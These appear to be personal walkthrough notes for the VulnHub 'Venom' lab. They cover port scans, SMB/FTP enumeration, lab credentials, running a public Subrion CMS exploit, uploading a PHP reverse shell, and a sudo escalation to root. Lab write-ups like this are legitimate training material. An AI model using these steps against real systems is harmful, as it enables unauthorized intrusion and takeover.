
---

**Venom** 
Venom URL: https://www.vulnhub.com/entry/venom-1,701/

\[OS]: 
\[Web-Technology]: 
\[Hostname]:  VENOM
\[IP]:  192.168.56.117
\[USERS]:   nathan, hostinger, dora
\[CREDENTIALS]:  
**FTP** hostinger :: hostinger
http://venom.box/login dora :: E7r9t8@Q#h%Hy+M1234

nathan :: FzN+f2-rRaBgvALzj*Rk#_JJYfg8XfKhxqB82x_a

---
\[To-Try LIST]:  

**FTP**
21/tcp  open  ftp         vsftpd 3.0.3 
No anonymous or vulns

**Samba**
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)




**Web**
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
443/tcp open  http        Apache httpd 2.4.29





---
\[NMAP RESULTS]:  
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  http        Apache httpd 2.4.29
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
MAC Address: 08:00:27:56:E0:28 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: Hosts: VENOM, 127.0.1.1; OS: Unix

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-11-01T13:05:55
|_  start_date: N/A
|_nbstat: NetBIOS name: VENOM, NetBIOS user: \<unknown>, NetBIOS MAC: \<unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: venom
|   NetBIOS computer name: VENOM\x00
|   Domain name: \x00
|   FQDN: venom
|_  System time: 2025-11-01T18:35:54+05:30
|_clock-skew: mean: -1h47m25s, deviation: 3h10m31s, median: 2m34s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required


--- 

\[Web Services Enumeration]:   

**SMB Enum**
```bash
smbclient -L //$IP -N

nmap --script smb-enum-shares $IP
nxc smb $IP -u '' -p '' --shares

# Shows - guest - no signing
print$
IPC$

enum4linux -a $IP

# Found users nathan, hostinger

## hostinger :: hostinger valid for FTP
```

**FTP**
```bash
ftp $IP
hostinger :: hostinger
cd files
ls #hint.txt
get hint.txt

cat hint.txt


* You need to follow the 'hostinger' on WXpOU2FHSnRVbWhqYlZGblpHMXNibHBYTld4amJWVm5XVEpzZDJGSFZuaz0= also aHR0cHM6Ly9jcnlwdGlpLmNvbS9waXBlcy92aWdlbmVyZS1jaXBoZXI=
* some knowledge of cipher is required to decode the dora password..
* try on venom.box
password -- L7f9l8@J#p%Ue+Q1234 -> deocode this you will get the administrator password

# Potential user: dora
# Encoded text:
# WXpOU2FHSnRVbWhqYlZGblpHMXNibHBYTld4amJWVm5XVEpzZDJGSFZuaz0= -> YzNSaGJtUmhjbVFnZG1sblpXNWxjbVVnWTJsd2FHVnk= -> c3RhbmRhcmQgdmlnZW5lcmUgY2lwaGVy

#aHR0cHM6Ly9jcnlwdGlpLmNvbS9waXBlcy92aWdlbmVyZS1jaXBoZXI= -> https://cryptii.com/pipes/vigenere-cipher
#
#Other key thing - need to follow the hostinger
# Try on venom.box - I add this to /etc/hosts

# Went to https://cryptii.com/pipes/vigenere-cipher
# Put L7f9l8@J#p%Ue+Q1234  with key hostinger -> E7r9t8@Q#h%Hy+M1234



```

**Web**
Port 80/443:
Default  *It Works*
Page Source -> !...<5f2a66f947fa5690c26506f66bde5c23> follow this to get access on somewhere.....--> -> hostinger - another way to find that I guess

**venom.box** --> Subrion CMS 4.2 (whatweb)

```bash
searchsploit subrion 4.2
searchsploit -m 49876

#also a login page:
http://venom.box/login/

Login works with dora :: E7r9t8@Q#h%Hy+M1234


python 49876.py -u http://venom.box/panel/ -l dora -p E7r9t8@Q#h%Hy+M1234
```

![[Pasted image 20251101100754.png]]
```bash

this one ended up being finnicky so I just uploaded a rev-shell.phar to the CMS and navigated to it

http://venom.box/uploads/php-reverse-shell.phar

```

---


\[OTHER / PRIVILEGE-ESCALATION]:   

```bash
#Now we are logged in as www-data - get tty persistence

# I looked around and couldnt find much as www-data

su hostinger #pass still hostinger - again still not much until I read bash history and saw .htaccess

```
![[Pasted image 20251101104419.png]]
![[Pasted image 20251101104254.png]]

```bash

# AS nathan
sudo -l

User nathan may run the following commands on venom:
    (root) ALL, !/bin/su
    (root) ALL, !/bin/su

Nathan can run all commands as root besides su

sudo /bin/bash #This works


```



--- 
Take Away Concepts: 



HOTKEYS! 
Background: Black 
Foreground (important elements): Red 
Background-Color: Select Text > Shift + Alt + B + ENTER 
Foreground Color: Select Text > Shift + Alt + F + ENTER 
Move quickly with: Function key + left and right arrows 
Cntrl + left and right arrows 
Cntrl + Shift (select text) (edited)
